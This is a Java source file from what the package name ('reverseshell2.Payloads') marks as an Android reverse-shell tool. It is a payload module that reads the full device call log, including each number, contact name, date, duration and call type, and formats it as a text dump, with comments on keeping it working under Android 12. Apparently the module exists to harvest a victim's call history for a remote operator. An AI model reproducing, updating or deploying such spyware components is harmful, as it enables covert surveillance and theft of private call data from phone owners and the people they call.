package com.example.reverseshell2.Payloads;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;

import java.util.Date;

/**
 * Call log reader, updated for Android 12.
 *
 * Changes for Android 12:
 *  1. managedQuery() is DEPRECATED and must NOT be used. Replaced with
 *     context.getContentResolver().query().
 *  2. READ_CALL_LOG is a dangerous permission (since Android 6). On Android 12
 *     it MUST be granted at runtime before querying the call log. This class now
 *     checks the permission and returns a clear message if missing.
 *  3. Fixed cursor iteration (was fragile and called moveToNext() inside a
 *     count-based for loop).
 *  4. Cursor is now properly closed (resource leak fix).
 *  5. call_logs field is initialized so the result never starts with "null".
 */
public class readCallLogs {

    Context context;
    Activity activity;

    String call_logs = "";

    public readCallLogs(Context context, Activity activity) {
        this.context = context;
        this.activity = activity;
    }

    public String readLogs() {

        // Android 6+ requires READ_CALL_LOG at runtime.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            boolean granted = context.checkSelfPermission(Manifest.permission.READ_CALL_LOG)
                    == PackageManager.PERMISSION_GRANTED;
            if (!granted) {
                return "Read Call Log Permission Not Granted\n";
            }
        }

        Uri allCalls = Uri.parse("content://call_log/calls");
        Cursor c = null;
        StringBuilder result = new StringBuilder();

        try {
            // managedQuery() is deprecated; use ContentResolver.query() instead.
            c = context.getContentResolver().query(allCalls, null, null, null, null);

            if (c != null && c.moveToFirst()) {
                int index = 0;
                do {
                    String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    String duration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    int type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String callDate = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    Date callDayTime = new Date(Long.parseLong(callDate));

                    result.append("#").append(index).append("\n");
                    result.append("Number : ").append(num == null ? "" : num).append("\n");
                    result.append("Name : ").append(name == null ? "" : name).append("\n");
                    result.append("Date : ").append(callDayTime).append("\n");
                    result.append("Duration : ").append(duration).append("\n");
                    result.append("Type : ").append(type).append("\n");
                    result.append("\n");
                    index++;
                } while (c.moveToNext());
                result.append("\n");
            }
        } catch (SecurityException e) {
            return "Read Call Log Permission Not Granted\n";
        } catch (Exception e) {
            return "Error reading call logs\n";
        } finally {
            if (c != null) {
                c.close();
            }
        }

        return result.length() == 0 ? "No Call Logs Found\n" : result.toString();
    }
}

